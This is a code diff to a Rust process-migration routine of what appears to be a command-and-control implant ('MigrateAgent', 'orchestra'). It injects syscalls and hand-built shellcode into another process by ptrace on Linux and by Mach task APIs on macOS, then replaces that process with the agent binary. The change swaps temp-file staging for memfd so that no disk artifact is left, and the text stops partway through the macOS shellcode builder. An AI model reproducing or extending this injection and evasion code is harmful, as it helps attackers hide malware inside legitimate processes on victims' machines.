@@ -130,40 +130,29 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("PTRACE_GETREGS failed: {}", std::io::Error::last_os_error());
             }
 
-            // ── Stage 3: Inject mmap syscall to allocate RWX memory ──────────
+            // ── Stage 3: Inject mmap syscall to allocate RW memory ───────────
             // We overwrite bytes at the current RIP with a `syscall; int3` sequence
-            // to trigger a mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC,
+            // to trigger a mmap(NULL, size, PROT_READ|PROT_WRITE,
             //                      MAP_PRIVATE|MAP_ANON, -1, 0)  (SYS_mmap = 9 on x86_64)
             // then singlestep and read RAX for the new mapping address.
 
-            // ── Stage 2.5: Stage the agent binary to a temp path ─────────────
-            // We inject a small execve shellcode that exec-replaces the target with
-            // the staged agent binary.  Injecting the raw ELF binary as "shellcode"
-            // is incorrect because the ELF header is not valid x86-64 code at offset 0;
-            // the stub below is pure position-independent shellcode.
-
-            let our_exe = std::env::current_exe()
+            // ── Stage 2.5: Read agent binary into memory (no disk artifact) ───
+            // We use memfd_create to hold the binary in an anonymous in-memory
+            // file descriptor, then execve from /proc/self/fd/<n>.  No temporary
+            // file is written to disk.
+            let agent_path = std::env::current_exe()
                 .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
-            let staged =
-                std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
-            std::fs::copy(&our_exe, &staged).map_err(|e| {
-                anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display())
+            let agent_binary = std::fs::read(&agent_path).map_err(|e| {
+                anyhow::anyhow!(
+                    "failed to read agent binary {}: {e}",
+                    agent_path.display()
+                )
             })?;
-            {
-                use std::os::unix::fs::PermissionsExt;
-                let mut perms = std::fs::metadata(&staged)?.permissions();
-                perms.set_mode(0o700);
-                std::fs::set_permissions(&staged, perms)?;
-            }
             tracing::info!(
-                "staged agent binary at {} for pid {}",
-                staged.display(),
+                "read agent binary ({} bytes) for memfd migration to pid {}",
+                agent_binary.len(),
                 target_pid
             );
-
-            // Build a position-independent execve shellcode: the stub ends with the
-            // null-terminated staged-path string so the code is fully self-contained.
-            let payload = build_execve_stub(&staged)?;
 
             #[cfg(target_arch = "x86_64")]
             {
@@ -177,73 +166,102 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 );
                 // syscall (0F 05) + int3 (CC) + nops to fill 8 bytes
                 let inject_word: u64 = 0xcc9090909090050f_u64; // LE: 0F 05 90 90 90 90 90 CC
-                libc::ptrace(
-                    libc::PTRACE_POKEDATA,
-                    target_pid as libc::pid_t,
-                    orig_rip as *mut libc::c_void,
-                    inject_word as *mut libc::c_void,
-                );
 
-                // Set up mmap(NULL, alloc_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
-                const SYS_MMAP: u64 = 9;
-                const PROT_RWX: u64 = 7; // PROT_READ|PROT_WRITE|PROT_EXEC
-                const MAP_PA: u64 = 0x22; // MAP_PRIVATE|MAP_ANON
-                let alloc_size = ((payload.len() + 4095) & !4095) as u64;
-                let mut mmap_regs = regs;
-                mmap_regs.rax = SYS_MMAP;
-                mmap_regs.rdi = 0;
-                mmap_regs.rsi = alloc_size;
-                mmap_regs.rdx = PROT_RWX;
-                mmap_regs.r10 = MAP_PA;
-                mmap_regs.r8 = u64::MAX; // -1 as fd
-                mmap_regs.r9 = 0;
-                libc::ptrace(
-                    libc::PTRACE_SETREGS,
-                    target_pid as libc::pid_t,
-                    0usize,
-                    &mmap_regs as *const _ as usize,
-                );
+                // Helper: inject a single syscall, wait for completion, return RAX.
+                let mut run_syscall = |sys: u64,
+                                       arg0: u64,
+                                       arg1: u64,
+                                       arg2: u64,
+                                       arg3: u64,
+                                       arg4: u64,
+                                       arg5: u64|
+                 -> Result<u64> {
+                    // Write syscall;int3 at RIP.
+                    libc::ptrace(
+                        libc::PTRACE_POKEDATA,
+                        target_pid as libc::pid_t,
+                        orig_rip as *mut libc::c_void,
+                        inject_word as *mut libc::c_void,
+                    );
+                    let mut sc_regs = regs;
+                    sc_regs.rax = sys;
+                    sc_regs.rdi = arg0;
+                    sc_regs.rsi = arg1;
+                    sc_regs.rdx = arg2;
+                    sc_regs.r10 = arg3;
+                    sc_regs.r8 = arg4;
+                    sc_regs.r9 = arg5;
+                    libc::ptrace(
+                        libc::PTRACE_SETREGS,
+                        target_pid as libc::pid_t,
+                        0usize,
+                        &sc_regs as *const _ as usize,
+                    );
+                    libc::ptrace(
+                        libc::PTRACE_CONT,
+                        target_pid as libc::pid_t,
+                        0usize,
+                        0usize,
+                    );
+                    libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
+                    let mut result_regs: libc::user_regs_struct =
+                        MaybeUninit::zeroed().assume_init();
+                    libc::ptrace(
+                        libc::PTRACE_GETREGS,
+                        target_pid as libc::pid_t,
+                        0usize,
+                        &mut result_regs as *mut _ as usize,
+                    );
+                    // Restore original bytes at RIP.
+                    libc::ptrace(
+                        libc::PTRACE_POKEDATA,
+                        target_pid as libc::pid_t,
+                        orig_rip as *mut libc::c_void,
+                        orig_word as *mut libc::c_void,
+                    );
+                    Ok(result_regs.rax)
+                };
 
-                // Run until int3 (PTRACE_CONT + waitpid SIGTRAP).
-                libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
-                libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
-
-                // Read result: RAX holds mmap return value.
-                let mut post_regs: libc::user_regs_struct = MaybeUninit::zeroed().assume_init();
-                libc::ptrace(
-                    libc::PTRACE_GETREGS,
-                    target_pid as libc::pid_t,
-                    0usize,
-                    &mut post_regs as *mut _ as usize,
-                );
-                let remote_buf = post_regs.rax as usize;
-
-                // Restore original bytes at RIP.
-                libc::ptrace(
-                    libc::PTRACE_POKEDATA,
-                    target_pid as libc::pid_t,
-                    orig_rip as *mut libc::c_void,
-                    orig_word as *mut libc::c_void,
-                );
-
-                if remote_buf == usize::MAX || remote_buf == 0 {
+                let detach_and_bail = |msg: String| -> Result<()> {
                     libc::ptrace(
                         libc::PTRACE_DETACH,
                         target_pid as libc::pid_t,
                         0usize,
                         0usize,
                     );
-                    anyhow::bail!("remote mmap failed (returned {remote_buf:#x})");
+                    anyhow::bail!("{msg}");
+                };
+
+                // ── Stage 3: mmap RW buffer large enough for the agent binary ──
+                const SYS_MMAP: u64 = 9;
+                const PROT_RW: u64 = 3; // PROT_READ|PROT_WRITE
+                const MAP_PA: u64 = 0x22; // MAP_PRIVATE|MAP_ANON
+                let alloc_size = ((agent_binary.len() + 4095) & !4095) as u64;
+
+                let remote_buf = run_syscall(
+                    SYS_MMAP,
+                    0,          // addr = NULL
+                    alloc_size, // length
+                    PROT_RW,    // prot
+                    MAP_PA,     // flags
+                    u64::MAX,   // fd = -1
+                    0,          // offset
+                )?;
+                if remote_buf == u64::MAX || remote_buf == 0 {
+                    detach_and_bail(format!(
+                        "remote mmap failed (returned {remote_buf:#x})"
+                    ))?;
+                    unreachable!()
                 }
 
-                // ── Stage 4: Write payload via process_vm_writev ─────────────
+                // ── Stage 4: Write agent binary to remote buffer via process_vm_writev ──
                 let local_iov = libc::iovec {
-                    iov_base: payload.as_ptr() as *mut _,
-                    iov_len: payload.len(),
+                    iov_base: agent_binary.as_ptr() as *mut _,
+                    iov_len: agent_binary.len(),
                 };
                 let remote_iov = libc::iovec {
                     iov_base: remote_buf as *mut _,
-                    iov_len: payload.len(),
+                    iov_len: agent_binary.len(),
                 };
                 let written = libc::process_vm_writev(
                     target_pid as libc::pid_t,
@@ -254,49 +272,155 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     0,
                 );
                 if written < 0 {
-                    libc::ptrace(
-                        libc::PTRACE_DETACH,
-                        target_pid as libc::pid_t,
-                        0usize,
-                        0usize,
-                    );
-                    anyhow::bail!(
+                    detach_and_bail(format!(
                         "process_vm_writev failed: {}",
                         std::io::Error::last_os_error()
-                    );
+                    ))?;
+                    unreachable!()
                 }
 
-                // ── Stage 5: Inject clone(CLONE_VM|CLONE_FS|CLONE_FILES, ...) to
-                //             create a new thread in the target that runs the execve stub ──
-                // The new thread starts at remote_buf where we wrote the shellcode stub.
-                // The stub calls execve(staged_path, NULL, NULL) which exec-replaces the
-                // target process image with the agent binary — this is the migration.
+                // ── Stage 4a: memfd_create("", MFD_CLOEXEC) in target ─────────
+                // SYS_memfd_create = 319 on x86_64 Linux.
+                const SYS_MEMFD_CREATE: u64 = 319;
+                const MFD_CLOEXEC: u64 = 1;
+                // The name argument is a pointer to an empty string in the target's
+                // buffer.  We write a single NUL byte at offset 0 of remote_buf
+                // (the beginning of the agent binary which we already copied to the
+                // memfd — the kernel doesn't read from this address until memfd_create
+                // returns, so it's safe to reuse).  Actually, we need a valid pointer
+                // to "".  We use the start of the mmap'd buffer — the first byte of
+                // an ELF binary is 0x7f, not NUL.  Instead, we write a NUL byte to
+                // a known location using process_vm_writev.
+                let nul_byte = [0u8; 1];
+                let nul_iov = libc::iovec {
+                    iov_base: nul_byte.as_ptr() as *mut _,
+                    iov_len: 1,
+                };
+                // Place the NUL at alloc_size - 1 (last byte of the mmap'd region).
+                let nul_addr = remote_buf as usize + alloc_size as usize - 1;
+                let nul_remote_iov = libc::iovec {
+                    iov_base: nul_addr as *mut _,
+                    iov_len: 1,
+                };
+                libc::process_vm_writev(
+                    target_pid as libc::pid_t,
+                    &nul_iov,
+                    1,
+                    &nul_remote_iov,
+                    1,
+                    0,
+                );
+
+                let memfd_fd = run_syscall(
+                    SYS_MEMFD_CREATE,
+                    nul_addr as u64, // name → "" (NUL byte)
+                    MFD_CLOEXEC,
+                    0,
+                    0,
+                    0,
+                    0,
+                )?;
+                let memfd_fd = memfd_fd as i32;
+                if memfd_fd < 0 {
+                    detach_and_bail(format!(
+                        "remote memfd_create failed (returned {memfd_fd})"
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4b: write(fd, remote_buf, binary_len) — copy binary to memfd ──
+                const SYS_WRITE: u64 = 1;
+                let write_result = run_syscall(
+                    SYS_WRITE,
+                    memfd_fd as u64,            // fd
+                    remote_buf,                 // buf (agent binary)
+                    agent_binary.len() as u64,  // count
+                    0,
+                    0,
+                    0,
+                )?;
+                let bytes_written = write_result as i64;
+                if bytes_written < 0 || (bytes_written as usize) != agent_binary.len() {
+                    detach_and_bail(format!(
+                        "remote write to memfd failed (returned {bytes_written}, expected {})",
+                        agent_binary.len()
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4c: Build execve stub for /proc/self/fd/<fd> ────────
+                let fd_path = format!("/proc/self/fd/{memfd_fd}");
+                let payload = build_execve_stub(std::path::Path::new(&fd_path))?;
+
+                // Overwrite beginning of remote_buf with the execve stub
+                // (the binary is safely stored in the memfd now).
+                let stub_iov = libc::iovec {
+                    iov_base: payload.as_ptr() as *mut _,
+                    iov_len: payload.len(),
+                };
+                let stub_remote_iov = libc::iovec {
+                    iov_base: remote_buf as *mut _,
+                    iov_len: payload.len(),
+                };
+                let stub_written = libc::process_vm_writev(
+                    target_pid as libc::pid_t,
+                    &stub_iov,
+                    1,
+                    &stub_remote_iov,
+                    1,
+                    0,
+                );
+                if stub_written < 0 {
+                    detach_and_bail(format!(
+                        "process_vm_writev (stub) failed: {}",
+                        std::io::Error::last_os_error()
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 4.5: Transition mapped pages from RW to RX via mprotect ──
+                const SYS_MPROTECT: u64 = 10;
+                const PROT_RX: u64 = 5; // PROT_READ|PROT_EXEC
+                let mprot_result = run_syscall(
+                    SYS_MPROTECT,
+                    remote_buf,
+                    alloc_size,
+                    PROT_RX,
+                    0,
+                    0,
+                    0,
+                )?;
+                if mprot_result != 0 {
+                    detach_and_bail(format!(
+                        "remote mprotect failed (returned {:#x})",
+                        mprot_result
+                    ))?;
+                    unreachable!()
+                }
+
+                // ── Stage 5: Inject clone — new thread runs the execve stub ────
+                // The stub calls execve("/proc/self/fd/<fd>", NULL, NULL) which
+                // exec-replaces the target with the agent binary from the memfd.
+                const SYS_CLONE: u64 = 56;
+                const CLONE_FLAGS: u64 = 0x3D0F00;
+                let stack_top = remote_buf as usize + (alloc_size as usize / 2) + 0x4000;
+
+                // Write syscall;int3 at RIP for the clone.
                 libc::ptrace(
                     libc::PTRACE_POKEDATA,
                     target_pid as libc::pid_t,
                     orig_rip as *mut libc::c_void,
                     inject_word as *mut libc::c_void,
                 );
-
-                // SYS_clone = 56 on x86_64
-                // CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD = 0x3D0F00
-                const SYS_CLONE: u64 = 56;
-                const CLONE_FLAGS: u64 = 0x3D0F00;
-                // Stack for the new thread lives in the upper half of the mmap'd region.
-                // The execve stub is tiny (<= 128 bytes typically) so there is plenty
-                // of space for a minimal stack before the stub's path data.
-                let stack_top = remote_buf + (alloc_size as usize / 2) + 0x4000;
                 let mut clone_regs = regs;
                 clone_regs.rax = SYS_CLONE;
                 clone_regs.rdi = CLONE_FLAGS;
                 clone_regs.rsi = stack_top as u64;
-                clone_regs.rdx = 0; // parent_tidptr (NULL)
-                clone_regs.r10 = 0; // child_tidptr (NULL)
-                clone_regs.r8 = 0; // tls (NULL)
-                                   // Set RIP = remote_buf so that when clone() copies the register state,
-                                   // the child starts executing the execve shellcode.  The parent will
-                                   // have its original RIP restored immediately below.
-                clone_regs.rip = remote_buf as u64;
+                clone_regs.rdx = 0;
+                clone_regs.r10 = 0;
+                clone_regs.r8 = 0;
+                // Set RIP = remote_buf so the child starts at the execve stub.
+                clone_regs.rip = remote_buf;
 
                 libc::ptrace(
                     libc::PTRACE_SETREGS,
@@ -304,7 +428,12 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                     0usize,
                     &clone_regs as *const _ as usize,
                 );
-                libc::ptrace(libc::PTRACE_CONT, target_pid as libc::pid_t, 0usize, 0usize);
+                libc::ptrace(
+                    libc::PTRACE_CONT,
+                    target_pid as libc::pid_t,
+                    0usize,
+                    0usize,
+                );
                 libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
 
                 // Restore original bytes and original registers.
@@ -329,8 +458,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 );
                 tracing::info!(
                     target_pid,
-                    remote_buf = remote_buf,
-                    "MigrateAgent: execve stub injected via ptrace+clone on Linux x86_64"
+                    remote_buf = remote_buf as usize,
+                    memfd_fd,
+                    "MigrateAgent: execve stub injected via ptrace+memfd+clone on Linux x86_64"
                 );
             }
 
@@ -449,28 +579,20 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         );
     }
 
-    // Stage the agent binary to a temp path.  The execve shellcode we inject
-    // into the target process exec-replaces it with the staged binary, so the
-    // binary must be accessible via the filesystem at the staged path.
+    // Read the agent binary into memory.  We inject it into the target process
+    // alongside a memfd+execve shellcode stub — no disk staging needed.
     let agent_path =
         std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
-    let staged = std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
-    std::fs::copy(&agent_path, &staged).map_err(|e| {
-        anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display())
+    let agent_binary = std::fs::read(&agent_path).map_err(|e| {
+        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
     })?;
-    {
-        use std::os::unix::fs::PermissionsExt;
-        let mut perms = std::fs::metadata(&staged)?.permissions();
-        perms.set_mode(0o700);
-        std::fs::set_permissions(&staged, perms)?;
-    }
-    tracing::info!("staged agent binary at {}", staged.display());
+    tracing::info!(
+        "read agent binary ({} bytes) for memfd migration",
+        agent_binary.len()
+    );
 
-    // Build the execve shellcode stub for this architecture.
-    // Injecting the raw Mach-O binary bytes as "shellcode" is incorrect because
-    // a Mach-O file header is not valid machine code at offset 0; the stub below
-    // is pure position-independent shellcode that calls execve(staged_path, NULL, NULL).
-    let payload = build_macos_execve_stub(&staged)?;
+    // The shellcode stub is built after we know the address of the binary data
+    // in the target process.  See the architecture-specific blocks below.
 
     // --- Mach API declarations ---
     // mach_port_t is u32 on both arm64 and x86_64 macOS.
@@ -565,36 +687,64 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
             }
 
-            // Allocate RW memory in the target for the payload.
-            let mut remote_addr: mach_vm_address_t = 0;
+            // 1. Allocate RW region for the agent binary data.
+            let mut binary_addr: mach_vm_address_t = 0;
             let kr = mach_vm_allocate(
                 target_task,
-                &mut remote_addr,
-                payload.len() as u64,
+                &mut binary_addr,
+                agent_binary.len() as u64,
                 VM_FLAGS_ANYWHERE,
             );
             if kr != KERN_SUCCESS {
                 mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_allocate failed: kern_return={kr}");
+                anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
             }
 
-            // Write payload bytes.
+            // 2. Write the agent binary.
             let kr = mach_vm_write(
                 target_task,
-                remote_addr,
-                payload.as_ptr(),
-                payload.len() as u32,
+                binary_addr,
+                agent_binary.as_ptr(),
+                agent_binary.len() as u32,
             );
             if kr != KERN_SUCCESS {
                 mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_write failed: kern_return={kr}");
+                anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
             }
 
-            // Change protection to RX.
+            // 3. Build memfd+execve shellcode with binary_addr and binary_len embedded.
+            let shellcode = build_macos_memfd_stub(binary_addr, agent_binary.len());
+
+            // 4. Allocate RW region for the shellcode.
+            let mut code_addr: mach_vm_address_t = 0;
+            let kr = mach_vm_allocate(
+                target_task,
+                &mut code_addr,
+                shellcode.len() as u64,
+                VM_FLAGS_ANYWHERE,
+            );
+            if kr != KERN_SUCCESS {
+                mach_port_deallocate(host, target_task);
+                anyhow::bail!("mach_vm_allocate(code) failed: kern_return={kr}");
+            }
+
+            // 5. Write the shellcode.
+            let kr = mach_vm_write(
+                target_task,
+                code_addr,
+                shellcode.as_ptr(),
+                shellcode.len() as u32,
+            );
+            if kr != KERN_SUCCESS {
+                mach_port_deallocate(host, target_task);
+                anyhow::bail!("mach_vm_write(code) failed: kern_return={kr}");
+            }
+
+            // 6. Protect the code region to RX.
             let kr = mach_vm_protect(
                 target_task,
-                remote_addr,
-                payload.len() as u64,
+                code_addr,
+                shellcode.len() as u64,
                 false,
                 VM_PROT_READ | VM_PROT_EXECUTE,
             );
@@ -603,12 +753,11 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
             }
 
-            // Create a new thread in the target whose initial RIP points at the
-            // execve shellcode stub.  The stub starts at remote_addr because we
-            // wrote the stub (not a Mach-O binary) to that address.
+            // 7. Create a new thread whose initial RIP points at the shellcode.
+            //    The shellcode performs: memfd_create → write(fd, binary, len) →
+            //    format /dev/fd/N → execve → exit(1) fallback.
             let mut state = X86ThreadState64::default();
-            state.rip = remote_addr;
-            // Allocate a fresh stack for the new thread (8 MB, stack pointer at high end).
+            state.rip = code_addr;
             let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
             let mut stack_addr: mach_vm_address_t = 0;
             mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
@@ -619,7 +768,6 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 false,
                 VM_PROT_READ | VM_PROT_WRITE,
             );
-            // Stack grows down; rsp must be 16-byte aligned minus 8 (ABI requirement).
             state.rsp = (stack_addr + stack_size - 8) & !15;
 
             let mut new_thread: mach_port_t = 0;
@@ -637,7 +785,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             mach_port_deallocate(mach_task_self(), new_thread);
             tracing::info!(
                 target_pid,
-                "MigrateAgent: remote thread created via Mach API"
+                "MigrateAgent: memfd migration thread created via Mach API (x86_64)"
             );
             Ok(())
         }
@@ -678,33 +826,64 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
             }
 
-            let mut remote_addr: mach_vm_address_t = 0;
+            // 1. Allocate RW region for the agent binary data.
+            let mut binary_addr: mach_vm_address_t = 0;
             let kr = mach_vm_allocate(
                 target_task,
-                &mut remote_addr,
-                payload.len() as u64,
+                &mut binary_addr,
+                agent_binary.len() as u64,
                 VM_FLAGS_ANYWHERE,
             );
             if kr != KERN_SUCCESS {
                 mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_allocate failed: kern_return={kr}");
+                anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
             }
 
+            // 2. Write the agent binary.
             let kr = mach_vm_write(
                 target_task,
-                remote_addr,
-                payload.as_ptr(),
-                payload.len() as u32,
+                binary_addr,
+                agent_binary.as_ptr(),
+                agent_binary.len() as u32,
             );
             if kr != KERN_SUCCESS {
                 mach_port_deallocate(host, target_task);
-                anyhow::bail!("mach_vm_write failed: kern_return={kr}");
+                anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
             }
 
+            // 3. Build memfd+execve shellcode with binary_addr and binary_len embedded.
+            let shellcode = build_macos_memfd_stub(binary_addr, agent_binary.len());
+
+            // 4. Allocate RW region for the shellcode.
+            let mut code_addr: mach_vm_address_t = 0;
+            let kr = mach_vm_allocate(
+                target_task,
+                &mut code_addr,
+                shellcode.len() as u64,
+                VM_FLAGS_ANYWHERE,
+            );
+            if kr != KERN_SUCCESS {
+                mach_port_deallocate(host, target_task);
+                anyhow::bail!("mach_vm_allocate(code) failed: kern_return={kr}");
+            }
+
+            // 5. Write the shellcode.
+            let kr = mach_vm_write(
+                target_task,
+                code_addr,
+                shellcode.as_ptr(),
+                shellcode.len() as u32,
+            );
+            if kr != KERN_SUCCESS {
+                mach_port_deallocate(host, target_task);
+                anyhow::bail!("mach_vm_write(code) failed: kern_return={kr}");
+            }
+
+            // 6. Protect the code region to RX.
             let kr = mach_vm_protect(
                 target_task,
-                remote_addr,
-                payload.len() as u64,
+                code_addr,
+                shellcode.len() as u64,
                 false,
                 VM_PROT_READ | VM_PROT_EXECUTE,
             );
@@ -713,8 +892,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
                 anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
             }
 
+            // 7. Create a new thread whose initial PC points at the shellcode.
             let mut state = ArmThreadState64::default();
-            state.pc = remote_addr;
+            state.pc = code_addr;
             let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
             let mut stack_addr: mach_vm_address_t = 0;
             mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
@@ -742,7 +922,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             mach_port_deallocate(mach_task_self(), new_thread);
             tracing::info!(
                 target_pid,
-                "MigrateAgent: remote arm64 thread created via Mach API"
+                "MigrateAgent: memfd migration thread created via Mach API (aarch64)"
             );
             Ok(())
         }
@@ -750,83 +930,262 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
 
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
     {
-        let _ = payload;
+        let _ = (&agent_binary, target_pid);
         anyhow::bail!("macOS migration not implemented for this architecture")
     }
 }
 
-/// Build a position-independent execve shellcode stub for macOS.
-/// Uses BSD syscalls (macOS syscall ABI: `syscall` with rax|0x2000000 on x86_64;
-/// `svc #0x80` with x16 on arm64).
+/// Build a position-independent shellcode stub that performs memfd-based
+/// process migration on macOS.
+///
+/// The stub executes the following syscall sequence:
+///   1. memfd_create("", MFD_CLOEXEC)  → fd
+///   2. write(fd, binary_addr, binary_len)
+///   3. Build "/dev/fd/NNN" path on the stack via itoa
+///   4. execve("/dev/fd/NNN", NULL, NULL)
+///   5. exit(1) if execve fails
 #[cfg(target_os = "macos")]
-fn build_macos_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
-    use std::os::unix::ffi::OsStrExt;
-    let path_bytes = path.as_os_str().as_bytes();
-    if path_bytes.contains(&0u8) {
-        anyhow::bail!("staged path contains a null byte: {}", path.display());
-    }
-
+fn build_macos_memfd_stub(binary_addr: u64, binary_len: usize) -> Vec<u8> {
     #[cfg(target_arch = "x86_64")]
     {
-        // Code layout (30 bytes):
-        //  [0] 48 8D 3D 17 00 00 00  lea rdi, [rip+23]  → path string at offset 30
-        //  [7] 31 F6                 xor esi, esi        → argv=NULL
-        //  [9] 31 D2                 xor edx, edx        → envp=NULL
-        // [11] B8 3B 00 00 02        mov eax, 0x200003B  → SYS_execve (macOS)
-        // [16] 0F 05                 syscall
-        // [18] BF 01 00 00 00        mov edi, 1
-        // [23] B8 01 00 00 02        mov eax, 0x2000001  → SYS_exit (macOS)
-        // [28] 0F 05                 syscall
-        // [30] <path bytes> \0
-        const CODE_SIZE: usize = 30;
-        let rel: i32 = CODE_SIZE as i32 - 7;
-        let mut stub = vec![0x48, 0x8D, 0x3D];
-        stub.extend_from_slice(&rel.to_le_bytes());
-        stub.extend_from_slice(&[
-            0x31, 0xF6, // xor esi, esi
-            0x31, 0xD2, // xor edx, edx
-            0xB8, 0x3B, 0x00, 0x00, 0x02, // mov eax, 0x200003B
-            0x0F, 0x05, // syscall
-            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
-            0xB8, 0x01, 0x00, 0x00, 0x02, // mov eax, 0x2000001
-            0x0F, 0x05, // syscall
-        ]);
-        debug_assert_eq!(stub.len(), CODE_SIZE);
-        stub.extend_from_slice(path_bytes);
-        stub.push(0);
-        Ok(stub)
+        build_macos_memfd_stub_x86_64(binary_addr, binary_len)
     }
-
     #[cfg(target_arch = "aarch64")]
     {
-        // Code layout (32 bytes), macOS arm64 BSD syscall ABI (svc #0x80, x16=number):
-        //  [0]  00 01 00 10  adr x0, #32   → path string at offset 32
-        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
-        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
-        // [12]  70 07 80 D2  movz x16, #59 → SYS_execve (macOS arm64 = 59)
-        // [16]  01 10 00 D4  svc #0x80
-        // [20]  20 00 80 D2  movz x0, #1   → exit code
-        // [24]  30 00 80 D2  movz x16, #1  → SYS_exit (macOS arm64 = 1)
-        // [28]  01 10 00 D4  svc #0x80
-        // [32]  <path bytes> \0
-        let stub = vec![
-            0x00, 0x01, 0x00, 0x10, // adr x0, #32
-            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
-            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
-            0x70, 0x07, 0x80, 0xD2, // movz x16, #59 (SYS_execve)
-            0x01, 0x10, 0x00, 0xD4, // svc #0x80
-            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
-            0x30, 0x00, 0x80, 0xD2, // movz x16, #1 (SYS_exit)
-            0x01, 0x10, 0x00, 0xD4, // svc #0x80
-        ];
-        let mut out = stub;
-        out.extend_from_slice(path_bytes);
-        out.push(0);
-        Ok(out)
+        build_macos_memfd_stub_aarch64(binary_addr, binary_len)
+    }
+    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
+    {
+        let _ = (binary_addr, binary_len);
+        Vec::new()
+    }
+}
+
+/// macOS x86_64 memfd+execve shellcode.
+/// Uses BSD syscall ABI: syscall number in rax | 0x2000000.
+#[cfg(all(target_os = "macos", target_arch = "x86_64"))]
+fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
+    let mut code = Vec::new();
+
+    // === Step 1: memfd_create("", MFD_CLOEXEC) ===
+    // push 0 (NUL terminator for empty string name)
+    code.extend_from_slice(&[0x6a, 0x00]);
+    // mov rdi, rsp (name = "")
+    code.extend_from_slice(&[0x48, 0x89, 0xe7]);
+    // mov esi, 1 (MFD_CLOEXEC)
+    code.extend_from_slice(&[0xbe, 0x01, 0x00, 0x00, 0x00]);
+    // mov rax, 0x2000000 + 518 (SYS_memfd_create)
+    code.extend_from_slice(&[0x48, 0xb8]);
+    code.extend_from_slice(&(0x2000000u64 + 518).to_le_bytes());
+    // syscall
+    code.extend_from_slice(&[0x0f, 0x05]);
+    // mov r12, rax (save fd)
+    code.extend_from_slice(&[0x49, 0x89, 0xc4]);
+
+    // === Step 2: write(fd, binary_addr, binary_len) ===
+    // mov rdi, r12 (fd)
+    code.extend_from_slice(&[0x4c, 0x89, 0xe7]);
+    // mov rsi, binary_addr
+    code.extend_from_slice(&[0x48, 0xbe]);
+    code.extend_from_slice(&binary_addr.to_le_bytes());
+    // mov rdx, binary_len
+    code.extend_from_slice(&[0x48, 0xba]);
+    code.extend_from_slice(&(binary_len as u64).to_le_bytes());
+    // mov rax, 0x2000000 + 4 (SYS_write)
+    code.extend_from_slice(&[0x48, 0xb8]);
+    code.extend_from_slice(&(0x2000000u64 + 4).to_le_bytes());
+    // syscall
+    code.extend_from_slice(&[0x0f, 0x05]);
+
+    // === Step 3: Build "/dev/fd/N" path on stack via itoa ===
+    // sub rsp, 32 (path buffer)
+    code.extend_from_slice(&[0x48, 0x83, 0xec, 0x20]);
+    // lea r8, [rsp+31] (point to last byte)
+    code.extend_from_slice(&[0x4c, 0x8d, 0x44, 0x24, 0x1f]);
+    // mov byte [r8], 0 (NUL terminator)
+    code.extend_from_slice(&[0x41, 0xc6, 0x00, 0x00]);
+    // mov rax, r12 (fd for itoa)
+    code.extend_from_slice(&[0x4c, 0x89, 0xe0]);
+
+    // itoa loop: convert fd to decimal digits right-to-left
+    let itoa_loop_start = code.len();
+    // dec r8
+    code.extend_from_slice(&[0x49, 0xff, 0xc8]);
+    // xor edx, edx
